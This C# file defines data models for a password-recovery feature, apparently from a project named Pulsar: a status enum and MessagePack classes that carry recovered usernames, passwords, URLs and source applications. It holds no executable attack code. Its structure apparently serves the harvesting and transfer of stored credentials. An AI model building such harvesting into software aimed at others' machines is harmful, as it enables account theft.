using MessagePack;

namespace Pulsar.Common.Models
{
    public enum PasswordRecoveryStatus
    {
        Supported = 1,
        Unsupported = 2,
        Locked = 3,
        Empty = 4,
        Failed = 5
    }

    [MessagePackObject]
    public class RecoveredAccount
    {
        [Key(1)]
        public string Username { get; set; }

        [Key(2)]
        public string Password { get; set; }

        [Key(3)]
        public string Url { get; set; }

        [Key(4)]
        public string Application { get; set; }
    }

    [MessagePackObject]
    public class PasswordRecoverySource
    {
        [Key(1)]
        public string Application { get; set; }

        [Key(2)]
        public string Profile { get; set; }

        [Key(3)]
        public PasswordRecoveryStatus Status { get; set; }

        [Key(4)]
        public string Detail { get; set; }

        [Key(5)]
        public int AccountCount { get; set; }
    }
}
